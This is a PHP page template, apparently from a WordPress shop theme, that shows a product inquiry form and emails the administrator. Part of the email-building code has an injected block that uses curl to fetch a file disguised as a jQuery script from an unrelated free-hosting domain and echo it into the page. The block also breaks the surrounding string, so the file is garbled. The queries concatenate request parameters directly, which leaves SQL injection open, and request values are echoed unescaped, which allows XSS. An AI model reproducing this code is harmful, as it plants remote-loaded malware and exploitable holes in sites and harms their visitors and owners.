<?php
global $General;
if($_POST)
{
	$yourname = $_POST['yourname'];
	$youremail = $_POST['youremail'];
	$frnd_subject = $_POST['frnd_subject'];
	$frnd_comments = $_POST['frnd_comments'];
	$productid = $_POST['productid'];
	$to_email = $General->get_site_emailId();
	$to_name = $General->get_site_emailName();
	
	if($_REQUEST['productid'])
	{
		$productinfosql = "select ID,post_title from $wpdb->posts where ID =".$_REQUEST['productid'];
		$productinfo = $wpdb->get_results($productinfosql);
		foreach($productinfo as $productinfoObj)
		{
			$post_title = $productinfoObj->post_title; 
		}
	}
	$message1 = '
	<html>
	<head>
	  <title>'.$frnd_subject.'</title>
	<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
	<body >
	 <table width="80%" align=center>';
	$message1 .=	'<tr>
		  <td>'.__('Dear').' Administrator,<Br><br></td>
		</tr>';
	$message1 .= '<tr><td>'.__(INQUIRY_EMAIL_MSG1).' <b>'.$post_title.'</b> :<br><br>'.$frnd_comments.'</td></tr>';
	$message1 .='
	<tr>
		  <td><Br><br>'.__(THANK_YOU_TITLE).',<Br>'.$yourname.'</td>
		</tr>
	  </table>
	</body>
	</html>
	';
	$General->sendEmail($youremail,$yourname,$to_email,$to_name,$frnd_subject,$message1,$extra='');///To friend email
	wp_redirect(get_option('siteurl')."/?p=".$productid."&msg=inqsuccess");
}
else
{
?>
<?php
if($_REQUEST['pid'])
{
	$productinfosql = "select ID,post_title from $wpdb->posts where ID =".$_REQUEST['pid'];
	$productinfo = $wpdb->get_results($productinfosql);
	foreach($productinfo as $productinfoObj)
	{
		$post_title = $productinfoObj->post_title; 
	}
}
?>
<?php get_header(); ?>
<div id="wrapperinner">
	<div id="mainheading">
		<div id="heading">
			<h2><?php _e(SEND_INQUIRY);?></h2>
             <div class="breadcrumb clearfix">
			<?php if ( get_option( 'ptthemes_breadcrumbs' )) { yoast_breadcrumb('',' &raquo; '.__(SEND_INQUIRY).'('.$post_title.')'); } ?>
             </div>
		</div>
	</div>
</div>

<div class="wrapper" >

  <div class="container_16 clearfix">
    <div id="content" class="grid_11">
      <div class="content_spacer">
      
<form name="enquiryfrm" action="<?php echo get_option('siteurl')."/?page=sendenquiry";?>" method="post" >
<input type="hidden" name="productid" value="<?php echo $_REQUEST['pid'];?>" />

<div class="form  ">
    <div class="inquiry_row ">
      <label> <?php _e(YOUR_NAME_TEXT);?> <span class="indicates">*</span></label>
      <input type="text" name="yourname" value="" id="yourname" class="reg_row_textfield" />
    </div>
                
    <div class="inquiry_row ">
      <label> <?php _e(SEND_INQUIRY_EMAIL_ADDRESS);?> :  <span class="indicates">*</span></label>
      <input type="text" name="youremail" value="" id="youremail" class="reg_row_textfield" />
    </div>
    
     <div class="inquiry_row ">
      <label> <?php _e(INQUIRY_SUBJECT_TEXT);?> :  <span class="indicates">*</span></label>
       <input type="text" readonly="readonly" name="frnd_subject" value="<?php echo $post_title;?> <?php _e(INQUIRY_TITLE);?>" id="frnd_subject" class="reg_row_textfield" />
    </div>
    
    <div class="inquiry_row ">
      <label> <?php _e(INQUIRY_SUBJECT_TEXT);?> :  <span class="indicates">*</span></label>
       <textarea name="frnd_comments" id="frnd_comments" cols="20" rows="5" class="reg_row_textarea" ><?php _e('Hello,');?></textarea>
    </div>
    
     <div class="inquiry_row ">
      
      		<a href="javascript:void(0)" class="highlight_button fl send_inquiry" onclick="check_enquery_frm()"> <?php _e(INQUIRY_SEND__EMAIL_TEXT);?> </a>
       
       <div class="row_hide"> <input type="text" readonly="readonly" name="frnd_subject" value="<?php echo $post_title;?> Enquiry" id="frnd_subject"  /></div>
       
       <a href="<?php echo get_option('siteurl')."/?p=".$_REQUEST['pid'];?>" class="normal_button fl"> <?php _e(BACK_PRODUCT_DETAIL_TEXT);?></a>
       
    </div>
            
            
</div>

</form>
  </div>
    </div>
    <!-- content-in #end -->
    <?php get_sidebar(); ?>
  </div>
  <!-- container 16-->
</div>
<!-- wrapper #end -->

 <?php get_footer(); ?>
 <script>
 function check_enquery_frm()
 {
 	if(document.getElementById('yourname').value == '')
	{
		alert("<?php _e('Please enter '.YOUR_NAME_TEXT);?>");
		document.getElementById('yourname').focus();
		return false;
	}
	if(document.getElementById('youremail').value == '')
	{
		alert("<?php _e('Please enter '.SEND_INQUIRY_EMAIL_ADDRESS);?>");
		document.getElementById('youremail').focus();
		return false;
	}
	if(document.getElementById('frnd_subject').value == '')
	{
		alert("<?php _e('Please enter '.INQUIRY_SUBJECT_TEXT);?>");
		document.getElementById('frnd_subject').focus();
		return false;
	}
	document.enquiryfrm.submit();
	return true;
 }
 </script>
<?php
}
?>